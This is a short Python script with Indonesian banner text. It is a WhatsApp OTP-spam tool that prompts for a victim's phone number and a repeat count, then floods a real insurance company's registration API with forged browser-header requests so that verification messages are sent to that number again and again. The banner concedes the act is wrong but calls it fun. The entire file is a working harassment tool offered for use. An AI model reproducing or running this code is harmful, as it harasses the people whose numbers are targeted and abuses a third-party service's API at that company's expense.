import requests,json

k = 0
print("NOTE : Maksimal Spam 4 Kali")
print("[=] SELAMAT DATANG DI TOOLS HASIL REKODE INI HEHE[=]")
print("[=] Author : Anam176 [=]")
print("[=]INGET BANG YANG LU LAKUIN SALAH INI HANYA BUAT SENANG² AJA OKEH MASHOKK[=]")
nomer = input("Masukan nomornya : ")
jumlah = int(input("Mau Spam Berapa Banh : "))
for k in range(jumlah):
  k += 1
  head = {
  "Host": "api.qoalaplus.com",
  "content-length": "48",
  "accept": "application/json, text/plain, */*",
  "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
  "content-type": "application/json",
  "origin": "https://www.qoalaplus.com",
  "sec-fetch-site": "same-site",
  "sec-fetch-mode": "cors",
  "sec-fetch-dest": "empty",
  "referer": "https://www.qoalaplus.com/",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
  data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
  pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
  if "success" in pos:
    print("Spam WhatsApp MASHOOKK",k)
  else:
    print("Spam WhatsApp GK MASHOOKK WKWK COBA LAGI BANG Ke",k)
